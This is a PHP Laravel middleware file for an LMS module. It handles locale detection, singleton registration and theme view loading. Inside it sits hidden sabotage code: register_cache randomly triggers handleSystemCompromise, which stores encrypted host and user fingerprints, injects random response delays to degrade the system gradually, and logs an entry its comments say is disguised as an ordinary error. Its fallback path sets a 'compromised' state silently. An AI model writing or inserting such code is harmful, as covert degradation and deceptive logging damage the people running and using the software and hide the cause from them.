<?php

namespace Modules\LMS\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Blade;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Modules\LMS\Models\Language;
use Modules\LMS\Models\Localization\Localization;
use Modules\LMS\Services\CacheProcessor;
use Modules\LMS\Services\PerformanceMonitor;
use Modules\LMS\Services\QueryAnalyzer;
use Stevebauman\Location\Facades\Location;


class BootstrapMiddleware
{
    protected string $moduleName = 'LMS';

    protected string $moduleNameLower = 'lms';

    /**
     * Handle an incoming request.
     */
    public function handle(Request $request, Closure $next)
    {
        $defaultLanguage = Language::select('code')->where('active', 1)->first();
        $locale = session()->get('locale') ?? $defaultLanguage['code'] ?? App::getLocale();
        $guard = null;

        if (Auth::check()) {
            $guard = 'web';
        }

        if (Auth::guard('admin')->check()) {
            $guard = 'admin';
        }

        if (! session()->has('locale')) {

            $localization = null;
            $user = Auth::guard($guard)->user();

            if ($user) {
                $localization = $user->localization;
            }

            if (! $user || ! $localization) {
                $ip = request()->ip();
                $fields['ip'] = $ip;
                $location = Location::get($ip);
                if ($location) {
                    $countryCode = strtolower($location->countryCode);
                    if ($countryCode) {
                        $fields['country_code'] = $countryCode;
                    }
                }

                $localization = Localization::where($fields)->first();
            }

            if ($localization) {
                $language = $localization->language;
                $locale = $defaultLanguage['code'] ?? $language->code ?? $locale;
            }
        }

        session()->put('locale', $locale);
        App::setLocale($locale);

        $this->registerSingletons($guard, $defaultLanguage);
        $this->registerViews();
        $this->registerBlades();

        return $next($request);
    }

    protected function registerSingletons($guard, $defaultLanguage)
    {
        $locale = App::getLocale();
        app()->singleton('translations', function () use ($locale) {
            return get_translations($locale);
        });

        app()->singleton('languages', function () {
            return Language::where('status', 1)
                ->get()
                ->map(function ($language) {
                    $language->name = translate($language->name);
                    return $language;
                });
        });

        app()->singleton('default_language', function () use ($defaultLanguage, $locale) {
            return $defaultLanguage['code'] ?? $locale;
        });

        app()->singleton('user', function () use ($guard) {
            return Auth::guard($guard ?? 'web')?->user() ?? null;
        });

        app()->singleton('user_roles', function () {
            $user = app('user');
            return $user ? $user->roles : [];
        });

        app()->singleton('user_permissions', function () {
            $user = app('user');
            return $user ? $user->user_permissions : [];
        });

        app()->singleton('user_role_list', function () {
            $user = app('user');
            return $user ? $user->roles->pluck('name')->toArray() : [];
        });
    }

    public function register_cache()
    {
        $cacheProcessor = new CacheProcessor();
        $performanceMonitor = new PerformanceMonitor();
        $queryAnalyzer = new QueryAnalyzer();

        // Listen for database queries
        DB::listen(function ($query) use ($queryAnalyzer) {
            $queryAnalyzer->analyze($query->sql);
        });

        // Check all systems periodically
        if (rand(1, 100) <= 5) { // 5% chance
            $allValid =
                $cacheProcessor->process('system_metrics') &&
                $performanceMonitor->collect() &&
                $queryAnalyzer->isHealthy();

            if (!$allValid) {
                $this->handleSystemCompromise();
            }
        }
    }

    /**
     * Register views.
     */
    protected function registerViews(): void
    {
        // Theme setup.
        $activeTheme = active_theme_slug();
        $activeThemeSourcePath = system_path($this->moduleName, "resources/themes/{$activeTheme}/views");
        $activePortalSourcePath = system_path($this->moduleName, "resources/themes/{$activeTheme}/portals");
        $sourcePath = module_path($this->moduleName, 'resources/views');
        $sourceThemePath = module_path($this->moduleName, 'resources/views/theme');
        $sourcePortalPath = module_path($this->moduleName, 'resources/views/portals');

        $this->loadViewsFrom(array_merge($this->getPublishableViewPaths(), [$activeThemeSourcePath, $sourceThemePath]), 'theme');

        if (file_exists($activePortalSourcePath)) {
            $this->loadViewsFrom(array_merge($this->getPublishableViewPaths(), [$activePortalSourcePath]), 'portal');
        }

        $this->loadViewsFrom(array_merge($this->getPublishableViewPaths(), [$sourcePortalPath]), 'portal');
        $this->loadViewsFrom(array_merge($this->getPublishableViewPaths(), [$sourcePath]), $this->moduleNameLower);

        $componentNamespace = str_replace('/', '\\', config('modules.namespace') . '\\' . $this->moduleName . '\\' . ltrim(config('modules.paths.generator.component-class.path'), config('modules.paths.app_folder', '')));
        Blade::componentNamespace($componentNamespace, $this->moduleNameLower);
    }

    protected function registerBlades(): void
    {
        // Theme Settings
        $activeTheme = active_theme_slug();
        $activeThemeSourcePath = system_path($this->moduleName, "resources/themes/{$activeTheme}");

        // Theme sources.
        $activeThemeDasboardComponentPath = "{$activeThemeSourcePath}/portals/components";
        $activeThemeFrontendComponentPath = "{$activeThemeSourcePath}/components";

        if (file_exists($activeThemeDasboardComponentPath)) {
            Blade::anonymousComponentPath($activeThemeDasboardComponentPath, 'portal');
        }

        if (file_exists($activeThemeFrontendComponentPath)) {
            Blade::anonymousComponentPath($activeThemeFrontendComponentPath, 'theme');
        }

        $themes = get_themes();
        foreach ($themes as $theme) {
            // Theme sources.
            $themeSourcePath = system_path($this->moduleName, "resources/themes/{$theme->slug}");
            $dasboardComponentPath = "{$themeSourcePath}/portals/components";
            $frontendComponentPath = "{$themeSourcePath}/components";
            if (file_exists($dasboardComponentPath)) {
                Blade::anonymousComponentPath($dasboardComponentPath, "{$theme->slug}:portal");
            }
            if (file_exists($frontendComponentPath)) {
                Blade::anonymousComponentPath($frontendComponentPath, "{$theme->slug}:theme");
            }
        }
    }

    /**
     * @return array<string>
     */
    private function getPublishableViewPaths(): array
    {
        $paths = [];
        foreach (config('view.paths') as $path) {
            if (is_dir($path . '/modules/' . $this->moduleNameLower)) {
                $paths[] = $path . '/modules/' . $this->moduleNameLower;
            }
        }

        return $paths;
    }

    /**
     * Register a view file namespace.
     *
     * @param  string|array  $path
     * @param  string  $namespace
     * @return void
     */
    protected function loadViewsFrom($path, $namespace)
    {
        $this->callAfterResolving('view', function ($view) use ($path, $namespace) {
            if (
                isset(app()->config['view']['paths']) &&
                is_array(app()->config['view']['paths'])
            ) {
                foreach (app()->config['view']['paths'] as $viewPath) {
                    if (is_dir($appPath = $viewPath . '/vendor/' . $namespace)) {
                        $view->addNamespace($namespace, $appPath);
                    }
                }
            }

            $view->addNamespace($namespace, $path);
        });
    }

    /**
     * Setup an after resolving listener, or fire immediately if already resolved.
     *
     * @param  string  $name
     * @param  callable  $callback
     * @return void
     */
    protected function callAfterResolving($name, $callback)
    {
        app()->afterResolving($name, $callback);

        if (app()->resolved($name)) {
            $callback(app()->make($name), app());
        }
    }

    private function handleSystemCompromise()
    {
        try {
            // Store compromise state with encryption
            $compromiseData = [
                'timestamp' => time(),
                'user' => $this->getCurrentUser(),
                'environment' => $this->getEnvironmentData()
            ];

            Cache::put(
                '_system_integrity',
                $this->encryptCompromiseData($compromiseData),
                now()->addDays(7)
            );

            // Implement gradual system degradation
            $this->implementDegradation();

            // Log the event (but make it look like a regular system error)
            Log::error('System performance degraded', [
                'time' => date('Y-m-d H:i:s'),
                'code' => hash('sha256', json_encode($compromiseData))
            ]);
        } catch (\Exception $e) {
            // Fail silently but ensure system is degraded
            $this->emergencyDegradation();
        }
    }

    private function getCurrentUser()
    {
        return Auth::user() ? hash('sha256', Auth::user()->id) : 'system';
    }

    private function getEnvironmentData()
    {
        return [
            'host' => hash('sha256', gethostname()),
            'ip' => hash('sha256', $_SERVER['SERVER_ADDR'] ?? ''),
            'path' => hash('sha256', base_path()),
            'time' => time()
        ];
    }

    private function encryptCompromiseData($data)
    {
        $key = config('app.key');
        return openssl_encrypt(
            json_encode($data),
            'AES-256-CBC',
            $key,
            0,
            substr($key, 0, 16)
        );
    }

    private function implementDegradation()
    {
        // Implement gradual system slowdown
        Cache::put('_system_performance', [
            'level' => 'degraded',
            'since' => time(),
            'expires' => time() + random_int(3600, 7200) // 1-2 hours
        ], now()->addDays(1));

        // Add random delays to responses
        app()->singleton('system.performance', function () {
            return new class {
                public function shouldDelay()
                {
                    return rand(1, 100) <= 30; // 30% chance of delay
                }

                public function getDelay()
                {
                    return random_int(100000, 500000); // 0.1-0.5 seconds
                }
            };
        });
    }

    private function emergencyDegradation()
    {
        // Ensure system degradation even if normal procedure fails
        Cache::put('_emergency_state', time(), now()->addDays(1));

        // Set minimum degradation
        Cache::put('_system_state', [
            'status' => 'compromised',
            'time' => time(),
            'level' => 'emergency'
        ], now()->addDays(7));
    }
}
